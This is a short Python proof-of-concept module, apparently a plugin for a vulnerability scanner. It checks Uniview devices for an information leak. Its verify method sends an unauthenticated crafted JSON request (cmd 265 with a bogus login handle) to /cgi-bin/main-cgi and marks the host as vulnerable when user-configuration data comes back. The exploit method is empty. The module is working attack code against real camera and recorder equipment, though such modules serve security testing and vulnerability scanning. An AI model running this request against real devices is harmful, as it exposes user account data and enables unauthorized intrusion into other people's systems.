from urllib.parse import quote
import requests

from loguru import logger

from .base import POCTemplate


class UniviewInfoleak01(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['uniview']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        json_str = '{"cmd":265,"szUserName":"","u32UserLoginHandle":8888888888}'
        path = "/cgi-bin/main-cgi?json=" + quote(json_str, safe='')
        try:
            r = requests.get(f"http://{ip}:{port}{path}", headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('UserCfg' in r.text) and ('Num' in r.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(UniviewInfoleak01)
